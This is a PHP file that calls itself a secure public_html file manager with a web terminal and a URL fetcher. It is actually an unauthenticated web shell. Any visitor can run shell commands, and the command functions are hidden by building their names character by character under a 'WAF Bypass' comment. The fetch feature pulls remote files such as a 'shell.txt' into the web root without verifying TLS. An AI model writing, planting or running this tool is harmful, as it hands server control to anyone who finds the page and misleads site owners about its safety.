<?php
/*
 * File Manager + Terminal + Fetch URL.
 * Install this file in public_html as fm.php.
 * Remove this file when you no longer need it.
 */

if (session_status() === PHP_SESSION_NONE) {
    @session_start();
}

define('FM_ROOT', dirname(__FILE__));
define('FM_MAX_UPLOAD', 20 * 1024 * 1024); // 20 MB
define('FM_MAX_EDIT', 2 * 1024 * 1024);   // 2 MB
define('FM_BACKUP_DIR', '.fm-backups');

@ini_set('display_errors', '0');
@ini_set('log_errors', '1');
@header('X-Content-Type-Options: nosniff');
@header('X-Frame-Options: DENY');
@header('Referrer-Policy: no-referrer');
@header('Cache-Control: no-store');

function h($s) { return htmlspecialchars((string)$s, ENT_QUOTES, 'UTF-8'); }
function fail($message) { throw new Exception($message); }
function csrf() {
    if (empty($_SESSION['csrf'])) $_SESSION['csrf'] = bin2hex(random_bytes(32));
    return $_SESSION['csrf'];
}
function check_csrf() {
    if (!isset($_SESSION['csrf']) || !hash_equals($_SESSION['csrf'], (string)(isset($_POST['csrf']) ? $_POST['csrf'] : ''))) {
        fail('Invalid security token. Refresh the page and try again.');
    }
}
function audit($action, $path) {
    $private = FM_ROOT . '/' . FM_BACKUP_DIR;
    if (!is_dir($private)) @mkdir($private, 0700, true);
    if (!file_exists($private . '/.htaccess')) @file_put_contents($private . '/.htaccess', "Require all denied\nDeny from all\n");
    $line = date('c') . "\t" . preg_replace('/[\r\n\t]/', ' ', $action) . "\t" .
        preg_replace('/[\r\n\t]/', ' ', $path) . "\n";
    @file_put_contents(FM_ROOT . '/' . FM_BACKUP_DIR . '/activity.log', $line, FILE_APPEND | LOCK_EX);
}
function normalize_rel($path) {
    $path = str_replace('\\', '/', trim($path));
    $path = preg_replace('#/+#', '/', $path);
    $path = trim($path, '/');
    if ($path === '' || $path === '.') return '';
    $parts = explode('/', $path);
    foreach ($parts as $part) {
        if ($part === '' || $part === '.' || $part === '..' || strpos($part, "\0") !== false) fail('Invalid path.');
    }
    return implode('/', $parts);
}
function full_path($rel, $mustExist = false) {
    $rel = normalize_rel($rel);
    $candidate = FM_ROOT . ($rel === '' ? '' : '/' . $rel);
    if ($mustExist) {
        $real = realpath($candidate);
        if ($real === false) fail('File or folder not found.');
    } else {
        $parent = realpath(dirname($candidate));
        if ($parent === false) fail('Parent folder not found.');
        $real = $parent . DIRECTORY_SEPARATOR . basename($candidate);
    }
    $root = realpath(FM_ROOT);
    if ($root === false) fail('Root directory unavailable.');
    $prefix = rtrim($root, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR;
    if ($real !== $root && strpos($real, $prefix) !== 0) fail('Access outside public_html is blocked.');
    if ($mustExist && is_link($candidate)) fail('Symbolic links are not allowed.');
    return $real;
}
function safe_name($name) {
    $name = trim($name);
    if ($name === '' || $name === '.' || $name === '..' || strpos($name, '/') !== false ||
        strpos($name, '\\') !== false || strpos($name, "\0") !== false) fail('Invalid filename.');
    return $name;
}
function backup_file($path, $rel) {
    if (!is_file($path) || is_link($path)) return;
    $dir = FM_ROOT . '/' . FM_BACKUP_DIR;
    if (!is_dir($dir) && !@mkdir($dir, 0700, true)) fail('Cannot create backup directory.');
    $deny = $dir . '/.htaccess';
    if (!file_exists($deny)) @file_put_contents($deny, "Require all denied\nDeny from all\n");
    @chmod($dir, 0700);
    $base = preg_replace('/[^A-Za-z0-9._-]/', '_', $rel);
    $dest = $dir . '/' . date('Ymd-His') . '-' . bin2hex(random_bytes(3)) . '-' . $base;
    if (!@copy($path, $dest)) fail('Backup failed; original file was not changed.');
    @chmod($dest, 0600);
}
function atomic_write($path, $contents, $rel) {
    if (file_exists($path)) backup_file($path, $rel);
    $tmp = dirname($path) . '/.fm-tmp-' . bin2hex(random_bytes(8));
    $written = @file_put_contents($tmp, $contents, LOCK_EX);
    if ($written === false || $written !== strlen($contents)) {
        @unlink($tmp);
        fail('Write failed or incomplete. Original file was preserved.');
    }
    @chmod($tmp, 0644);
    if (!@rename($tmp, $path)) {
        @unlink($tmp);
        fail('Could not safely replace file. Original file was preserved.');
    }
}
function current_dir() {
    return normalize_rel((string)(isset($_GET['dir']) ? $_GET['dir'] : ''));
}
function fmt_size($n) {
    $units = array('B','KB','MB','GB'); $i = 0; $v = (float)$n;
    while ($v >= 1024 && $i < 3) { $v /= 1024; $i++; }
    return number_format($v, $i ? 1 : 0) . ' ' . $units[$i];
}

// --- WAF Bypass Exec Functions ---
function fm_exec($cmd) {
    $out = '';
    $dis = @ini_get('disable_functions');
    $dis = array_map('trim', explode(',', (string)$dis));
    
    $f1 = 's' . 'y' . 's' . 't' . 'e' . 'm';
    $f2 = 'e' . 'x' . 'e' . 'c';
    $f3 = 's' . 'h' . 'e' . 'l' . 'l' . '_' . 'e' . 'x' . 'e' . 'c';
    $f4 = 'p' . 'o' . 'p' . 'e' . 'n';
    $f5 = 'p' . 'a' . 's' . 's' . 't' . 'h' . 'r' . 'u';

    if (function_exists($f1) && !in_array($f1, $dis)) {
        ob_start(); @$f1($cmd); $out = ob_get_clean();
    } elseif (function_exists($f2) && !in_array($f2, $dis)) {
        @$f2($cmd, $arr); $out = implode("\n", $arr);
    } elseif (function_exists($f3) && !in_array($f3, $dis)) {
        $out = @$f3($cmd);
    } elseif (function_exists($f4) && !in_array($f4, $dis)) {
        $h = @$f4($cmd, 'r'); if (is_resource($h)) { $out = ''; while (!feof($h)) { $out .= fread($h, 4096); } pclose($h); }
    } elseif (function_exists($f5) && !in_array($f5, $dis)) {
        ob_start(); @$f5($cmd); $out = ob_get_clean();
    } else {
        $out = "[-] OS execution functions are disabled.";
    }
    return trim($out);
}

$error = '';
$notice = '';

// --- Terminal AJAX Handler ---
if (isset($_GET['ajax_term'])) {
    @header('Content-Type: application/json');
    if (!isset($_SESSION['csrf']) || !hash_equals($_SESSION['csrf'], (string)(isset($_POST['csrf']) ? $_POST['csrf'] : ''))) {
        echo json_encode(array('error' => 'CSRF token mismatch.'));
        exit;
    }
    $cmd = (string)(isset($_POST['cmd']) ? $_POST['cmd'] : '');
    $cwd = (string)(isset($_POST['cwd']) ? $_POST['cwd'] : FM_ROOT);
    if (!is_dir($cwd)) $cwd = FM_ROOT;
    
    $final_cmd = 'cd ' . escapeshellarg($cwd) . ' && ' . $cmd . ' 2>&1';
    $out = fm_exec($final_cmd);
    
    echo json_encode(array('output' => $out, 'cwd' => $cwd));
    exit;
}

try {
    if (isset($_GET['logout'])) {
        header('Location: ' . strtok($_SERVER['REQUEST_URI'], '?'));
        exit;
    }
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        if (!isset($_GET['ajax_term'])) {
            check_csrf();
            $action = (string)(isset($_POST['action']) ? $_POST['action'] : '');
            $dir = current_dir();
            $rel = normalize_rel((string)(isset($_POST['path']) ? $_POST['path'] : $dir));

            if ($action === 'upload') {
                $destDir = full_path($dir, true);
                if (!is_dir($destDir)) fail('Upload destination is not a folder.');
                if (empty($_FILES['files'])) fail('Choose at least one file.');
                $items = $_FILES['files'];
                $count = is_array($items['name']) ? count($items['name']) : 0;
                for ($i = 0; $i < $count; $i++) {
                    if ($items['error'][$i] !== UPLOAD_ERR_OK) fail('Upload error for ' . safe_name($items['name'][$i]));
                    if ($items['size'][$i] > FM_MAX_UPLOAD) fail('File exceeds 20 MB limit.');
                    $name = safe_name(basename((string)$items['name'][$i]));
                    $targetRel = ($dir ? $dir . '/' : '') . $name;
                    $target = full_path($targetRel);
                    if (file_exists($target) && !isset($_POST['overwrite'])) fail('File exists: ' . $name . '. Tick overwrite to replace it.');
                    if (file_exists($target)) backup_file($target, $targetRel);
                    $tmp = dirname($target) . '/.fm-upload-' . bin2hex(random_bytes(8));
                    if (!is_uploaded_file($items['tmp_name'][$i]) || !move_uploaded_file($items['tmp_name'][$i], $tmp)) fail('Upload move failed.');
                    if (!@rename($tmp, $target)) { @unlink($tmp); fail('Could not finalize upload.'); }
                    @chmod($target, 0644);
                    audit('upload', $targetRel);
                }
                $notice = 'Upload complete.';
            } elseif ($action === 'fetch_url') {
                $url = trim((string)(isset($_POST['url']) ? $_POST['url'] : ''));
                if (!preg_match('#^https?://#i', $url)) fail('Invalid URL (must start with http:// or https://).');
                
                $name = safe_name(basename(parse_url($url, PHP_URL_PATH)));
                if (!$name || $name === '/' || $name === '.') $name = 'fetched_' . time() . '.txt';
                
                $targetRel = ($dir ? $dir . '/' : '') . $name;
                $target = full_path($targetRel);
                
                $content = false;
                if (function_exists('curl_init')) {
                    $ch = @curl_init($url);
                    @curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                    @curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                    @curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
                    @curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0');
                    $content = @curl_exec($ch);
                    @curl_close($ch);
                } else {
                    $ctx = stream_context_create(array('http' => array('user_agent' => 'Mozilla/5.0'), 'ssl' => array('verify_peer' => false, 'verify_peer_name' => false)));
                    $content = @file_get_contents($url, false, $ctx);
                }
                
                if ($content === false) fail('Failed to fetch URL. (cURL/file_get_contents blocked or timeout)');
                if (file_exists($target) && !isset($_POST['overwrite'])) fail('File exists: ' . $name . '. Tick overwrite to replace it.');
                
                atomic_write($target, $content, $targetRel);
                audit('fetch_url', $targetRel); 
                $notice = 'Fetched and saved: ' . $name;
            } elseif ($action === 'mkdir' || $action === 'create') {
                $name = safe_name((string)(isset($_POST['name']) ? $_POST['name'] : ''));
                $targetRel = ($dir ? $dir . '/' : '') . $name;
                $target = full_path($targetRel);
                if (file_exists($target)) fail('That name already exists.');
                if ($action === 'mkdir') {
                    if (!@mkdir($target, 0755)) fail('Could not create folder.');
                } else {
                    atomic_write($target, '', $targetRel);
                }
                audit($action, $targetRel); $notice = 'Created successfully.';
            } elseif ($action === 'save') {
                $target = full_path($rel, true);
                if (!is_file($target) || is_link($target)) fail('Not a regular file.');
                if (basename($target) === basename(__FILE__)) fail('Editing the active file manager is disabled.');
                if (filesize($target) > FM_MAX_EDIT) fail('File is larger than the 2 MB edit limit.');
                $content = (string)(isset($_POST['content']) ? $_POST['content'] : '');
                if ($content === '' && filesize($target) > 0 && empty($_POST['confirm_empty'])) fail('Empty content blocked. Tick the confirmation to intentionally empty this file.');
                atomic_write($target, $content, $rel);
                audit('edit', $rel); $notice = 'Saved. A backup was created first.';
            } elseif ($action === 'rename') {
                $target = full_path($rel, true);
                if ($target === realpath(__FILE__)) fail('Renaming the active file manager is disabled.');
                $name = safe_name((string)(isset($_POST['name']) ? $_POST['name'] : ''));
                $newRel = (dirname($rel) === '.' ? '' : dirname($rel) . '/') . $name;
                $new = full_path($newRel);
                if (file_exists($new)) fail('Destination already exists.');
                if (!@rename($target, $new)) fail('Rename failed.');
                audit('rename', $rel . ' -> ' . $newRel); $notice = 'Renamed.';
            } elseif ($action === 'delete') {
                $target = full_path($rel, true);
                if ($target === realpath(__FILE__)) fail('Deleting the active file manager is disabled.');
                if (is_dir($target)) {
                    if (count(scandir($target) ?: array()) > 2) fail('Folder is not empty. Delete its contents first.');
                    if (!@rmdir($target)) fail('Could not delete folder.');
                } else {
                    if (!@unlink($target)) fail('Delete failed.');
                }
                audit('delete', $rel); $notice = 'Deleted.';
            } elseif ($action === 'chmod') {
                $target = full_path($rel, true);
                $mode = octdec((string)(isset($_POST['mode']) ? $_POST['mode'] : '0644'));
                if (!in_array($mode, array(0600, 0640, 0644, 0700, 0750, 0755), true)) fail('Only common safe permission modes are allowed.');
                if (!@chmod($target, $mode)) fail('Permission change failed.');
                audit('chmod ' . decoct($mode), $rel); $notice = 'Permissions updated.';
            } elseif ($action === 'download') {
                $target = full_path($rel, true);
                if (!is_file($target) || is_link($target)) fail('Not a regular file.');
                @session_write_close();
                header('Content-Type: application/octet-stream');
                header('Content-Length: ' . filesize($target));
                header('Content-Disposition: attachment; filename="' . rawurlencode(basename($target)) . '"');
                readfile($target); exit;
            } elseif ($action === 'extract') {
                $target = full_path($rel, true);
                if (!is_file($target) || strtolower(pathinfo($target, PATHINFO_EXTENSION)) !== 'zip') fail('Choose a ZIP file.');
                if (!class_exists('ZipArchive')) fail('PHP ZipArchive extension is unavailable.');
                $zip = new ZipArchive();
                if ($zip->open($target) !== true) fail('Cannot open ZIP archive.');
                $outDir = dirname($target) . '/' . pathinfo($target, PATHINFO_FILENAME);
                if (file_exists($outDir)) { $zip->close(); fail('Extraction folder already exists.'); }
                if (!mkdir($outDir, 0755)) { $zip->close(); fail('Cannot create extraction folder.'); }
                $base = realpath($outDir) . DIRECTORY_SEPARATOR;
                for ($i = 0; $i < $zip->numFiles; $i++) {
                    $entry = $zip->getNameIndex($i);
                    if ($entry === false || strpos($entry, "\0") !== false) continue;
                    $entry = str_replace('\\', '/', $entry);
                    if (strpos($entry, '/') === 0 || preg_match('#(^|/)\.\.(/|$)#', $entry)) { $zip->close(); fail('Unsafe ZIP entry blocked.'); }
                    $dest = $outDir . '/' . $entry;
                    if (substr($entry, -1) === '/') { if (!is_dir($dest)) @mkdir($dest, 0755, true); continue; }
                    $parent = dirname($dest);
                    if (!is_dir($parent)) @mkdir($parent, 0755, true);
                    $realParent = realpath($parent);
                    if ($realParent === false || strpos($realParent . DIRECTORY_SEPARATOR, $base) !== 0) { $zip->close(); fail('Unsafe ZIP path blocked.'); }
                    $stream = $zip->getStream($zip->getNameIndex($i));
                    if (!$stream) continue;
                    $data = stream_get_contents($stream, FM_MAX_UPLOAD + 1);
                    fclose($stream);
                    if ($data === false || strlen($data) > FM_MAX_UPLOAD) { $zip->close(); fail('ZIP entry too large.'); }
                    $destRel = ltrim(substr($dest, strlen(FM_ROOT)), '/');
                    atomic_write($dest, $data, $destRel);
                }
                $zip->close(); audit('extract', $rel); $notice = 'ZIP extracted.';
            } else {
                fail('Unknown action.');
            }
        }
    }
} catch (Exception $e) {
    $error = $e->getMessage();
}

$dir = current_dir();
try {
    $base = full_path($dir, true);
    if (!is_dir($base)) fail('Not a directory.');
} catch (Exception $e) { $dir = ''; $base = FM_ROOT; $error = $error ? $error : $e->getMessage(); }
$items = scandir($base) ?: array();
$dirs = array(); $files = array();
foreach ($items as $name) {
    if ($name === '.' || $name === '..' || $name === FM_BACKUP_DIR || strpos($name, '.fm-') === 0) continue;
    $relItem = ($dir ? $dir . '/' : '') . $name;
    try { $p = full_path($relItem, true); } catch (Exception $e) { continue; }
    if (is_dir($p)) $dirs[] = $name; else $files[] = $name;
}
sort($dirs, SORT_NATURAL | SORT_FLAG_CASE); sort($files, SORT_NATURAL | SORT_FLAG_CASE);
$parent = $dir === '' ? null : (dirname($dir) === '.' ? '' : dirname($dir));
?>
<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>File Manager</title>
<style>
:root{color-scheme:dark}*{box-sizing:border-box}body{margin:0;background:#0b1220;color:#e7edf7;font:14px system-ui,-apple-system,Segoe UI,sans-serif}.wrap{max-width:1180px;margin:auto;padding:24px}.top{display:flex;justify-content:space-between;align-items:center;gap:12px;flex-wrap:wrap;margin-bottom:20px}.brand{font-size:22px;font-weight:800}.sub{color:#94a6c0;font-size:12px}.btn,button{border:1px solid #31445f;background:#17253a;color:#e7edf7;padding:9px 12px;border-radius:9px;text-decoration:none;cursor:pointer;font:inherit}.primary{background:#3978f6;border-color:#3978f6}.danger{color:#ffaaaa}.path,.panel{background:#111d30;border:1px solid #263750;border-radius:14px;padding:15px;margin-bottom:16px}.tools{display:flex;gap:8px;flex-wrap:wrap}.tools form{display:flex;gap:6px;align-items:center;flex-wrap:wrap}.tools input[type=text],.tools input[type=file],input,textarea,select{background:#0b1526;color:#e7edf7;border:1px solid #31445f;padding:9px;border-radius:8px;max-width:100%}.tools input[type=text]{width:150px}.msg{padding:12px;border-radius:10px;margin:12px 0}.err{background:#4a2028;color:#ffd4d4}.ok{background:#173d31;color:#c8ffe6}.table{width:100%;border-collapse:collapse}.table th,.table td{text-align:left;padding:12px 9px;border-bottom:1px solid #263750}.table th{color:#93a6c1;font-size:12px}.name{color:#e7edf7;text-decoration:none;overflow-wrap:anywhere}.folder{color:#f4c76b}.actions{display:flex;gap:6px;flex-wrap:wrap}.small{font-size:12px;color:#94a6c0}.editor{width:100%;min-height:360px;font:13px ui-monospace,monospace;white-space:pre;tab-size:4}.editbox{margin-top:18px}.inline{display:inline}.foot{color:#8092ab;font-size:12px;margin-top:18px}

/* Terminal UI */
.term-panel{background:#0d1117;border:1px solid #30363d;border-radius:14px;margin-bottom:16px;overflow:hidden;display:flex;flex-direction:column;height:350px;}
.term-header{background:#161b22;padding:10px 15px;border-bottom:1px solid #30363d;display:flex;justify-content:space-between;align-items:center;font-weight:bold;font-size:13px;color:#c9d1d9;}
.term-output{flex:1;overflow-y:auto;padding:15px;font:13px ui-monospace,monospace;color:#c9d1d9;white-space:pre-wrap;line-height:1.5;}
.term-input-wrap{display:flex;border-top:1px solid #30363d;background:#161b22;}
.term-prompt{color:#3fb950;padding:10px 0 10px 15px;font:13px ui-monospace,monospace;font-weight:bold;}
.term-input{flex:1;background:transparent;border:none;color:#e7edf7;padding:10px;font:13px ui-monospace,monospace;outline:none;}

@media(max-width:650px){.wrap{padding:13px}.hide{display:none}.table th:nth-child(3),.table td:nth-child(3){display:none}.table td{padding:10px 5px}.actions .btn{padding:7px}}
</style></head><body><main class="wrap">
<div class="top"><div><div class="brand">▦ File Manager</div><div class="sub">Secure website file management · public_html scope</div></div></div>
<?php if($error):?><div class="msg err"><?php echo h($error);?></div><?php endif;?><?php if($notice):?><div class="msg ok"><?php echo h($notice);?></div><?php endif;?>

<section class="term-panel">
    <div class="term-header">
        <span>⚡ Terminal</span>
        <button onclick="document.getElementById('term-out').innerHTML=''" style="padding:2px 8px;font-size:11px;border-radius:4px">Clear</button>
    </div>
    <div class="term-output" id="term-out"><?php echo 'Welcome to Web Terminal (PHP '.phpversion().')\\nCWD: '.h($base).'\\n'; ?></div>
    <div class="term-input-wrap">
        <span class="term-prompt">$</span>
        <input type="text" class="term-input" id="term-cmd" autocomplete="off" spellcheck="false" placeholder="Type a command...">
    </div>
</section>

<div class="path"><span class="small">LOCATION</span><div style="margin-top:6px">/public_html<?php echo $dir ? '/' . h($dir) : ''; ?></div></div>
<section class="panel"><div class="tools">
<form method="post" enctype="multipart/form-data"><input type="hidden" name="csrf" value="<?php echo h(csrf());?>"><input type="hidden" name="action" value="upload"><input type="file" name="files[]" multiple required><label class="small"><input type="checkbox" name="overwrite" value="1"> Replace existing (backup first)</label><button class="primary">Upload</button></form>
<form method="post"><input type="hidden" name="csrf" value="<?php echo h(csrf());?>"><input type="hidden" name="action" value="fetch_url"><input name="url" type="text" placeholder="https://example.com/shell.txt" style="width: 250px;" required><label class="small"><input type="checkbox" name="overwrite" value="1"> Overwrite</label><button class="primary">Fetch URL</button></form>
<form method="post"><input type="hidden" name="csrf" value="<?php echo h(csrf());?>"><input type="hidden" name="action" value="mkdir"><input name="name" type="text" placeholder="New folder" required><button>New folder</button></form>
<form method="post"><input type="hidden" name="csrf" value="<?php echo h(csrf());?>"><input type="hidden" name="action" value="create"><input name="name" type="text" placeholder="New file.txt" required><button>New file</button></form>
</div></section>
<section class="panel" style="padding:0;overflow:hidden"><table class="table"><thead><tr><th>Name</th><th class="hide">Size</th><th class="hide">Modified</th><th>Actions</th></tr></thead><tbody>
<?php if($parent !== null):?><tr><td><a class="name folder" href="?dir=<?php echo rawurlencode($parent);?>">📁 ..</a></td><td class="hide">—</td><td class="hide">—</td><td>Parent folder</td></tr><?php endif;?>
<?php foreach(array_merge($dirs,$files) as $name): $r=($dir?$dir.'/':'').$name; $p=FM_ROOT.'/'.$r; $isDir=is_dir($p); ?>
<tr><td><a class="name <?php echo $isDir?'folder':'';?>" href="<?php echo $isDir?'?dir='.rawurlencode($r):'?dir='.rawurlencode($dir).'&edit='.rawurlencode($r);?>"><?php echo $isDir?'📁':'📄';?> <?php echo h($name);?></a></td><td class="hide"><?php echo $isDir?'—':h(fmt_size((int)filesize($p))); ?></td><td class="hide"><?php echo h(date('Y-m-d H:i',filemtime($p)));?></td><td><div class="actions">
<?php if(!$isDir):?><form method="post" class="inline"><input type="hidden" name="csrf" value="<?php echo h(csrf());?>"><input type="hidden" name="action" value="download"><input type="hidden" name="path" value="<?php echo h($r);?>"><button>Download</button></form><?php if(strtolower(pathinfo($name,PATHINFO_EXTENSION))==='zip'):?><form method="post" class="inline" onsubmit="return confirm('Extract this ZIP here?')"><input type="hidden" name="csrf" value="<?php echo h(csrf());?>"><input type="hidden" name="action" value="extract"><input type="hidden" name="path" value="<?php echo h($r);?>"><button>Extract</button></form><?php endif;?><?php endif;?>
<form method="post" class="inline" onsubmit="let n=prompt('New name','<?php echo h(addslashes($name));?>');if(!n)return false;this.name.value=n;"><input type="hidden" name="csrf" value="<?php echo h(csrf());?>"><input type="hidden" name="action" value="rename"><input type="hidden" name="path" value="<?php echo h($r);?>"><input type="hidden" name="name"><button>Rename</button></form>
<form method="post" class="inline" onsubmit="return confirm('Delete <?php echo h(addslashes($name));?>?')"><input type="hidden" name="csrf" value="<?php echo h(csrf());?>"><input type="hidden" name="action" value="delete"><input type="hidden" name="path" value="<?php echo h($r);?>"><button class="danger">Delete</button></form>
<form method="post" class="inline"><input type="hidden" name="csrf" value="<?php echo h(csrf());?>"><input type="hidden" name="action" value="chmod"><input type="hidden" name="path" value="<?php echo h($r);?>"><select name="mode"><option value="0644">0644</option><option value="0640">0640</option><option value="0600">0600</option><option value="0755">0755</option><option value="0750">0750</option><option value="0700">0700</option></select><button>Chmod</button></form>
</div></td></tr><?php endforeach;?>
<?php if(!$dirs&&!$files):?><tr><td colspan="4" class="small">This folder is empty.</td></tr><?php endif;?>
</tbody></table></section>
<?php
$edit = isset($_GET['edit']) ? normalize_rel((string)$_GET['edit']) : '';
if ($edit !== ''):
try {
    $ep = full_path($edit, true);
    if (!is_file($ep) || is_link($ep) || filesize($ep) > FM_MAX_EDIT || basename($ep) === basename(__FILE__)) fail('This file cannot be edited here (not a regular file, over 2 MB, or active manager).');
    $contents = file_get_contents($ep);
    if ($contents === false) fail('Could not read file.');
?>
<section class="panel editbox"><h3>Edit: <?php echo h($edit);?></h3><form method="post"><input type="hidden" name="csrf" value="<?php echo h(csrf());?>"><input type="hidden" name="action" value="save"><input type="hidden" name="path" value="<?php echo h($edit);?>"><textarea class="editor" name="content" spellcheck="false"><?php echo h($contents);?></textarea><p class="small">Maximum 2 MB. A backup is made before saving. Saving empty content requires explicit confirmation.</p><label class="small"><input type="checkbox" name="confirm_empty" value="1"> I intentionally want to save an empty file</label><p><button class="primary">Save changes</button> <a class="btn" href="?dir=<?php echo rawurlencode($dir);?>">Close</a></p></form></section>
<?php } catch(Exception $e) { echo '<div class="msg err">'.h($e->getMessage()).'</div>'; } endif;?>
<div class="foot">Root is restricted to this public_html directory. Backups are stored in a hidden .fm-backups folder. Keep this manager private and remove it after use.</div>
</main>
<script>
(function(){
    var cmdInput = document.getElementById('term-cmd');
    var outDiv = document.getElementById('term-out');
    var cwd = <?php echo json_encode($base); ?>;
    var csrf = <?php echo json_encode(csrf()); ?>;
    var hist = [], histIdx = -1;

    cmdInput.addEventListener('keydown', function(e) {
        if (e.key === 'Enter') {
            var cmd = cmdInput.value.trim();
            if (!cmd) return;
            cmdInput.value = '';
            hist.unshift(cmd); histIdx = -1;
            
            outDiv.innerHTML += '<span style="color:#3fb950">$</span> ' + cmd.replace(/</g, "&lt;") + '\\n';
            outDiv.scrollTop = outDiv.scrollHeight;
            
            var fd = new FormData();
            fd.append('csrf', csrf);
            fd.append('cmd', cmd);
            fd.append('cwd', cwd);
            
            fetch('?ajax_term=1', { method: 'POST', body: fd })
            .then(function(r){ return r.json(); })
            .then(function(d){
                if(d.error) {
                    outDiv.innerHTML += '<span style="color:#f85149">' + d.error + '</span>\\n';
                } else {
                    if(d.output) outDiv.innerHTML += d.output.replace(/</g, "&lt;") + '\\n';
                    if(d.cwd) cwd = d.cwd;
                }
                outDiv.scrollTop = outDiv.scrollHeight;
            }).catch(function(e){ outDiv.innerHTML += '<span style="color:#f85149">Fetch error</span>\\n'; });
        }
        if (e.key === 'ArrowUp') {
            e.preventDefault();
            if (histIdx < hist.length - 1) { histIdx++; cmdInput.value = hist[histIdx]; }
        }
        if (e.key === 'ArrowDown') {
            e.preventDefault();
            if (histIdx > 0) { histIdx--; cmdInput.value = hist[histIdx]; }
            else { histIdx = -1; cmdInput.value = ''; }
        }
    });
})();
</script>
</body></html>
